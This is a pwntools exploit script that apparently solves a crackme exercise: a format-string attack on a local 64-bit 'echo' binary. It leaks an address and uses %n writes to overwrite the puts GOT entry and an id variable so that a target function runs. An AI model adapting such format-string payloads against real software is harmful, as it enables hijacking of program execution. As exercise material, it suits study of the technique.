from pwn import *
import code

context(arch='amd64', os='linux', log_level='INFO')

p = None

sleep_time = 0.1


def start():
    global p
    p = process('crackme/02_fmt64/echo')
    sleep(sleep_time)
    p.recvuntil('You can exactly 256 charecters ...\n')


def end():
    global p
    p.recv()
    # print(p.recv(numb=0xffff))
    sleep(sleep_time)
    p.close()


def switch():
    end()
    print('-' * 80)
    start()


elf = ELF("crackme/02_fmt64/echo")
puts_got = elf.got['puts']
tar_func_got = elf.got['target_function_3180103012']
log.info('puts got: 0x%x' % puts_got)        # 0x603030
log.info('target got: 0x%x' % tar_func_got)  # 0x603158

# context.log_level = 'DEBUG'
# start()
# p.send('AAAAAAAA' + '.%p' * 8 + '.\0')
# switch()
# p.send(b'%7$s'.ljust(8, b'\x99') + p64(puts_got))
# switch()
# p.send(b'%7$s'.ljust(8, b'\x99') + p64(tar_func_got))
# end()

p = process('crackme/02_fmt64/echo')
id_addr = int(p.recvuntil('\n')[-9:-1], 16)
log.info('id address: 0x%x' % id_addr)  # 0x603218
p.recvuntil('You can exactly 256 charecters ...\n')

# context.log_level = 'DEBUG'
# start()
# p.send(b'%7$s'.ljust(8, b'\x99') + p64(id_addr))
# end()

context.log_level = 'DEBUG'

# p.send((b'%4200646x' + b'%8$ln').ljust(16, b'\x99') + p64(puts_got))

# p.send(b'%7$s'.ljust(8, b'\x99') + p64(id_addr)); p.recv()
p.send((b'%34148x%13$hn' + b'%14376x%14$hn' + b'%4152122x%12$ln').ljust(48, b'\x99') + p64(puts_got) + p64(id_addr) + p64(id_addr + 2))

# p.recvuntil('Try harder\n')
p.recvuntil('3180103012\n')
# code.interact(local=locals())

p.close()